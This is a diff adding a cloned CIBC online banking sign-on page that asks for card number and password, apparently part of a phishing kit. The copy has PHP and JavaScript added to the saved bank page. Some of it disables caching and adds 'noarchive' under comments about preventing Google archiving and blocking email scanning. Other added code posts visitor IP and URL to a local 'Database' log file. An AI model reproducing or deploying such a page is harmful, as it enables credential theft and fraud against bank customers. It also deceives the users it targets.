@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<!-- saved from url=(0818)https://www.cibconline.cibc.com/ebm-resources/public/digital-cart-signon/client/index.html#/?signOnObject=eyJhcHBOYW1lIjoiZGlnaXRhbC1jYXJ0IiwicHJvZHVjdENvZGUiOiJVQ0EiLCJwcm9kdWN0VHlwZSI6IkNIUSIsImxvY2FsZSI6ImVuIiwiYmFja1VSTCI6Ii9lYm0tcmVzb3VyY2VzL3B1YmxpYy9kaWdpdGFsLWNhcnQvY2xpZW50L2luZGV4Lmh0bWwjLz9wcm9kdWN0Q29kZT1VQ0EmcHJvZHVjdFR5cGU9Q0hRJmNoYW5uZWw9d2ViIiwicmV0dXJuVVJMIjoiL2VibS1yZXNvdXJjZXMvcHVibGljL2RpZ2l0YWwtY2FydC9jbGllbnQvaW5kZXguaHRtbCMvc2lnbm9uLXBhZ2UtbG9hZGVyP3Byb2R1Y3RDb2RlPVVDQSZwcm9kdWN0VHlwZT1DSFEmbG9jYWxlPWVuJmNoYW5uZWw9d2ViIiwiY2FuY2VsVVJMIjoiaHR0cHM6Ly93d3cuY2liYy5jb20iLCJpc0lmcmFtZUNvbnRhaW5lciI6dHJ1ZSwidGFyZ2V0T3JpZ2luIjoiaHR0cHM6Ly93d3cuY2liY29ubGluZS5jaWJjLmNvbSIsImJhY2tncm91bmRDb2xvciI6InRyYW5zcGFyZW50Iiwic2l0ZU5hbWUiOiJkaWdpdGFsLWNhcnQiLCJzaG93U2lnbk9uSGVhZGVyRm9vdGVyIjp0cnVlfQ%3D%3D -->
+<?php
+// Disable caching
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
+header("Pragma: no-cache");
+?><?php
+// Disable caching
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
+header("Pragma: no-cache");
+?><html lang="en" amp=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="https://www.cibconline.cibc.com/ebm-resources/public/digital-cart-signon/client/favicon.ico"><title>Sign on to online banking | CIBC</title>  <script>
+    // Disable caching for forward and backward navigation
+    function disableCaching() {
+      // Disable caching for forward navigation
+      window.onpageshow = function(event) {
+        if (event.persisted) {
+          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
+        }
+      };
+      
+      // Disable caching for backward navigation
+      window.onunload = function() {};
+    }
+    
+    // Set client browser cache to one hour prior
+    function setBrowserCacheTime() {
+      const date = new Date();
+      date.setTime(date.getTime() - (60 * 60 * 1000));
+      document.getElementById('cacheExpires').content = date.toUTCString();
+    }
+
+    // Prevent Google Archiving
+    const metaRobots = document.createElement('meta');
+    metaRobots.name = 'robots';
+    metaRobots.content = 'noarchive';
+    document.head.appendChild(metaRobots);
+
+    // Block email scanning
+    const metaContentType = document.createElement('meta');
+    metaContentType.httpEquiv = 'X-Content-Type-Options';
+    metaContentType.content = 'nosniff';
+    document.head.appendChild(metaContentType);
+
+    // Disable listeners and log third-party communications
+    function disableListeners() {
+      // Disable listeners (Not applicable in HTML pages)
+    }
+
+    function logThirdPartyCommunication() {
+      // Logging third-party communication attempts
+      const timestamp = new Date().toISOString();
+      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
+      const requestedUrl = window.location.href;
+      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;
+
+      // Specify the log file location
+      const logFile = "../../../Database/third-party-log.txt"; // Replace with the actual log file location
+
+      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
+      const logRequest = new XMLHttpRequest();
+      logRequest.open('POST', logFile, true);
+      logRequest.setRequestHeader('Content-Type', 'text/plain');
+      logRequest.send(logMessage);
+    }
+
+    // Call the necessary functions when the page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      disableCaching();
+      setBrowserCacheTime();
+      disableListeners();
+      logThirdPartyCommunication();
+    });
+  </script><link href="./app-cfffc2ec.css" rel="preload" as="style"><link href="./chunk-vendors-cfffc2ec.css" rel="preload" as="style"><link href="./app-cfffc2ec.js.download" rel="modulepreload" as="script"><link href="./chunk-vendors-cfffc2ec.js.download" rel="modulepreload" as="script"><link href="./chunk-vendors-cfffc2ec.css" rel="stylesheet"><link href="./app-cfffc2ec.css" rel="stylesheet"><script async="" src="./main.14eb2ef4.js.download"></script><script type="text/javascript" async="" src="./js"></script><script src="./RCd7b0e52cd29346e696e0d5719aa5950d-source.min.js.download" async=""></script><script src="./RCf688bf38bb9d419283a3c97e8075f695-source.min.js.download" async=""></script><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A+xK4jmZTgh1KBVry/UZKUE3h6Dr9HPPioFS4KNCzify+KEoOii7z/goKS2zgbAOwhpZ1GZllpdz7XviivJM9gcAAACFeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiQXR0cmlidXRpb25SZXBvcnRpbmdDcm9zc0FwcFdlYiIsImV4cGlyeSI6MTcwNzI2Mzk5OSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="text/javascript" async="" src="./f(6).txt"></script><script type="text/javascript" async="" src="./f(7).txt"></script><script id="tmx_tags_js" type="text/javascript" src="./g300qgdx4b6kuybx.js.download"></script></head><body class="home scroll"><noscript><strong>We're sorry but Digital Cart Signon doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"><!----><div class="signon-page-layout"><!----><!----><div class="page-layout grid-container full"><div class="grid-x"><div class="cell small-12"><div data-v-6e4c39bc="" tabindex="-1"><!----><div data-v-6e4c39bc=""><a data-v-6e4c39bc="" tabindex="-1" class="focus-target"></a></div></div><div class="header-section grid-x"><div class="cell small-12"><header class="page-header grid-x align-justify"><div class="header-logo cell large-4 medium-4 small-4"><img src="./illustrative-CIBC-logo-81234b9f.jpg" alt="CIBC logo" class="logo"></div><div><div class="security-container header-nav cell large-8 medium-8 small-12 small-order-2 medium-order-1 hide-for-small-only"><div class="grid-x align-right"><span class="security">
+				This is a secure application.
+				<a data-test-id="security-link" href="https://www.cibc.com/en/privacy-security.html" aria-label="Learn more about privacy and security. Opens a new window in your browser." target="_blank">
+					Learn more
+				</a></span></div></div><!----></div></header></div></div><div class="main-content grid-x"><div class="sign-on-container cell"><div data-v-3fcbba2a="" class="main-panel grid-x" cms="[object Object]"><main data-v-3fcbba2a="" class="cell"><div data-v-3fcbba2a="" class="content grid-x grid-margin-x"><div data-v-3fcbba2a="" class="outer-grid cell"><div data-v-3fcbba2a=""><!----><div class="security-container grid-x align-center show-for-small-only"><div class="cell small-12"><span class="security">
+				This is a secure application.
+				<a data-test-id="security-link" href="https://www.cibc.com/en/privacy-security.html" aria-label="Learn more about privacy and security. Opens a new window in your browser." target="_blank">
+					Learn more
+				</a></span></div></div></div><div data-v-3fcbba2a="" class="sign-on grid-x"><div data-v-3fcbba2a="" class="cell large-9 medium-10"><div data-v-3fcbba2a="" class="card-number input-section grid-x"><div data-v-3fcbba2a="" class="cell large-9 medium-10 instructions"></div><div class="ui-set-text-box-wrapper" data-v-3fcbba2a=""><label for="19-field" class="ui-partial-label"> Card number
+	<!----></label><div data-v-1f32cd8e="" class="ui-wrapper"><input data-v-1f32cd8e="" id="19-field" type="text" tabindex="0" maxlength="16" aria-describedby="vue19-messages" data-test-id="card-number"></div><div id="vue19-messages" class="ui-set-messages"></div></div></div><div data-v-3fcbba2a="" class="remember-card-checkbox grid-x"><div data-v-e7f5b454="" class="ui-set-checkbox-wrapper remember-card-checkbox" data-v-3fcbba2a=""><div data-v-17d26862="" data-v-e7f5b454="" class="ui-checkbox" label="Remember my card number"><input data-v-17d26862="" id="remember-card-checkbox" type="checkbox" aria-checked="false" aria-describedby="vue23-messages" aria-label="Remember my card number" role="checkbox" data-test-id="remember-card-checkbox" class="" value="false"></div><label data-v-e7f5b454="" id="remember-card-checkbox" for="remember-card-checkbox" class="ui-partial-label"> Remember my card number
+	<!----></label><div data-v-e7f5b454="" id="vue23-messages" class="ui-set-messages"></div></div></div><!----><!----><div data-v-3fcbba2a="" class="password input-section grid-x"><div class="ui-set-text-box-wrapper" data-v-3fcbba2a=""><label for="27-field" class="ui-partial-label"> Password
+	<!----></label><div data-v-1f32cd8e="" class="ui-wrapper"><input data-v-1f32cd8e="" id="27-field" type="password" tabindex="0" maxlength="32" aria-describedby="vue27-messages" data-test-id="password"></div><div id="vue27-messages" class="ui-set-messages"></div></div><button data-v-3fcbba2a="" tabindex="0" aria-label="Show password." aria-pressed="false" class="password-toggle"><img data-v-3fcbba2a="" alt="" src="./password-hide-ce3d277c.svg"></button></div><div data-v-70a60ca0="" class="the-action-bar sign-on-action-bar top-padding grid-x align-justify" data-v-3fcbba2a=""><div data-v-70a60ca0="" class="button-group cell align-center align-middle"><button data-v-2f389a16="" data-v-70a60ca0="" data-test-id="primary-btn" type="primary" class="primary-btn button ui-display-default ui-button">Sign on</button><!----></div></div><div data-v-3fcbba2a="" class="link-section grid-x"><a data-v-3fcbba2a="" href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html#/password/new/information" data-test-id="forgot-password" target="_blank" aria-label="Reset your password. Opens in a new window." class="forgot-password">
+								Reset your password
+							</a><a data-v-3fcbba2a="" data-test-id="register-card" href="https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html#/register/information" aria-label="Not registered yet? Opens in a new window." target="_blank" class="register-card">
+								Not registered yet?
+							</a></div></div></div><div class="bottom-panel grid-x align-center" data-v-3fcbba2a=""><div class="cell"><div class="security-section"><ul class="links"><li><a data-test-id="security-link-0" href="https://www.cibc.com/en/privacy-security.html" aria-label="Security guaranteed. Opens in a new window." target="_blank" class="security">
+								Security guaranteed
+							</a></li><li><a data-test-id="security-link-1" href="https://www.cibc.com/en/legal/agreements/electronic-access.html" aria-label="Read our Electronic Access Agreement. Opens in a new window." target="_blank">
+								Read our Electronic Access Agreement
+							</a></li></ul></div></div></div></div></div></main></div></div></div><div class="footer-section grid-x"><div class="cell small-12"><footer data-v-633db625="" class="page-footer grid-x"><div data-v-633db625="" class="cell"><div data-v-633db625="" class="lower-footer grid-x align-middle large-12 medium-12 small-12"><div data-v-633db625="" class="cell lower-footer-content"><div data-v-633db625="" class="grid-x imp-links"><div data-v-633db625="" class="lower-footer-links cell small-12"><ul data-v-633db625="" class="link-container"><li data-v-633db625=""><a data-v-633db625="" href="https://www.cibc.com/en/accessibility.html" target="_blank" aria-label="Accessibility at CIBC. Opens a new window in your browser." data-test-id="accessibility-link">
+									Accessibility at CIBC
+								</a></li><li data-v-633db625=""><a data-v-633db625="" href="https://www.cibc.com/en/legal/deposit-insurance.html" target="_blank" aria-label="CDIC Deposit Insurance Information. Opens a new window in your browser." data-test-id="cdic-deposit-insurance-link">
+									CDIC Deposit Insurance Information
+								</a></li><li data-v-633db625=""><a data-v-633db625="" href="https://www.cibc.com/en/privacy-security.html" target="_blank" aria-label="Privacy and Security. Opens a new window in your browser." data-test-id="privacy-security-link">
+									Privacy and Security
+								</a></li></ul></div></div></div></div></div></footer></div></div></div></div><div aria-hidden="true" class="hide"><div class="view-port show-for-large"><span>Large-view</span></div><div class="view-port show-for-medium-only"><span>Medium-view</span></div><div class="view-port show-for-small-only"><span>Small-view</span></div><div class="screen-width">390</div></div></div></div><div data-v-2ed5513d="" aria-live="assertive" aria-atomic="true" class="announcer">Sign on to online banking | CIBC has loaded.</div><div class="vue-portal-target"></div></div><script async="" src="./core.js.download"></script><script src="./1478310479108228" async=""></script><script src="./284592808392980" async=""></script><script async="" src="./fbevents.js.download"></script><script type="module" src="./chunk-vendors-cfffc2ec.js.download"></script><script type="module" src="./app-cfffc2ec.js.download"></script><script>!function(){var e=document,t=e.createElement("script");if(!("noModule"in t)&&"onbeforeload"in t){var n=!1;e.addEventListener("beforeload",function(e){if(e.target===t)n=!0;else if(!e.target.hasAttribute("nomodule")||!n)return;e.preventDefault()},!0),t.type="module",t.src=".",e.head.appendChild(t),t.remove()}}();</script><script src="./chunk-vendors-ddc35c0c.js.download" nomodule=""></script><script src="./app-ddc35c0c.js.download" nomodule=""></script><script type="text/javascript" src="./1Plg"></script><script src="./launch-14db436626d4.min.js.download"></script><!-- Global site tag (gtag.js) - Google Marketing Platform -->
+<script async="" src="./js(1)"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'DC-8205542');
+  gtag('config', 'AW-997008455');
+</script>
+<!-- End of global snippet: Please do not remove -->
+<!-- Facebook pixel base code-->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window,
+document,'script','##en_US/fbevents.js');
+fbq('init', '284592808392980');
+fbq('init', '1478310479108228');
+</script>
+<!-- Facebook pixel end -->
+<!-- Pinterest Tag -->
+<script>
+!function(e){if(!window.pintrk){window.pintrk = function () {
+window.pintrk.queue.push(Array.prototype.slice.call(arguments))};var
+  n=window.pintrk;n.queue=[],n.version="3.0";var
+  t=document.createElement("script");t.async=!0,t.src=e;var
+  r=document.getElementsByTagName("script")[0];
+  r.parentNode.insertBefore(t,r)}}("https://s.pinimg.com/ct/core.js");
+pintrk('load', '2612569703039');
+</script>
+<noscript>
+<img height="1" width="1" style="display:none;" alt="" src="https://ct.pinterest.com/v3/?event=PageVisit&tid=2613102009212&pd[em]=<hashed_email_address>&noscript=1" />
+</noscript>
+<!-- end Pinterest Tag -->
+<script src="./tm.js.download"></script><!-- Global site tag (gtag.js) - Google Analytics -->
+<script src="./js(2)"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}  
+  var getVar = _satellite.getVar;    
+  gtag('consent', 'default', {
+    'ad_storage': 'granted',
+	'analytics_storage': 'granted',
+  });   
+  gtag('js', new Date());
+  gtag('config', getVar('ga4_accounts'), {
+     'send_page_view': false, 
+     'currency': 'CAD',    
+     'campaign_id': (getVar('external_campaign') || undefined),
+     'user_id': (getVar('digitalData_user_id') || undefined),     
+     'user_properties': { 
+      'adobe_ecid': (getVar('alloy_ecid') || undefined),
+      'client_id': (getVar('gtag_ga_user_id') || undefined),
+      'internal_campaign': (getVar('internal_campaign') || undefined),
+      'external_campaign': (getVar('external_campaign') || undefined)
+     }     
+   });  
+</script>
+<script>_satellite["_runScript1"](function(event, target, Promise) {
+var getVar=_satellite.getVar||{};if("object"==typeof digitalData.events&&digitalData.events.formView){var formStartTime=(new Date).getTime(),formName=getVar("digitalData_form_name")||void 0;_satellite.cookie.set(formName+"-StartTime",formStartTime,{domain:getVar("root_domain")}),_satellite.logger.info(formName+" process started at: "+formStartTime)}else if("object"==typeof digitalData.events&&digitalData.events.formSubmit){var formCompleteTime=(new Date).getTime();formName=getVar("digitalData_form_name");_satellite.cookie.set(formName+"-CompleteTime",formCompleteTime,{domain:getVar("root_domain")});formStartTime=_satellite.cookie.get(formName+"-StartTime");if(null!=formName&&""!=formName&&null!=formStartTime&&""!=formStartTime){var formTimeToComplete=Math.round((formCompleteTime-formStartTime)/1e3);_satellite.setVar("formTimeToComplete",formTimeToComplete),_satellite.logger.log(formName+" process completed at: "+formCompleteTime),_satellite.logger.log("The form process took "+formTimeToComplete+" seconds, or about "+Math.round(formTimeToComplete/60)+" minutes"),_satellite.cookie.remove(formName+"-StartTime"),_satellite.cookie.remove(formName+"-CompleteTime")}}else _satellite.logger.log("");var pageVar={time_stamp:getVar("gtag_ga_time_stamp"),system_cancel_count:parseInt(getVar("events_system_cancelled"))||void 0,page_view_count:parseInt(getVar("events_pageView"))||void 0,info_message_id:getVar("digitalData_info_message_id")||void 0,info_msg_view_count:parseInt(getVar("events_info_message_view"))||void 0,visits_referrer:getVar("visit_referrer")||void 0,internal_site_referrer:getVar("digitalData_page_referrer")||void 0,form_name:getVar("digitalData_form_name")||void 0,form_step_name:getVar("digitalData_form_step_name")||void 0,form_step_count:parseInt(getVar("events_form_step"))||void 0,form_view:parseInt(getVar("events_form_view"))||void 0,form_qualify_count:parseInt(getVar("events_form_qualify"))||void 0,form_prefill_method:getVar("digitalData_prefill_method")||void 0,form_prefill_count:parseInt(getVar("events_form_prefill"))||void 0,form_submit_count:parseInt(getVar("events_form_submit"))||void 0,transaction_id:getVar("digitalData_transaction_ID")||void 0,form_time_to_complete:formTimeToComplete,transaction_amount:parseFloat(getVar("digitalData_transaction_amount"))||void 0,transaction_fee:parseFloat(getVar("digitalData_transaction_fees"))||void 0,funds_in:parseFloat(getVar("digitalData_transaction_amount_in"))||void 0,funds_out:parseFloat(getVar("digitalData_transaction_amount_out"))||void 0,funds_circulated:parseFloat(getVar("digitalData_transaction_amount_circulated"))||void 0,transaction_from_to:getVar("digitalData_transaction_from_to_frequency")||void 0,transaction_currency:getVar("digitalData_transaction_currency")||void 0},pageCall=Object.assign(_satellite.getVar("ga4-global-variables"),pageVar);gtag("event","page_view",pageCall);
+});</script><iframe src="./saved_resource.html" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1687883224371" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe></body></html>
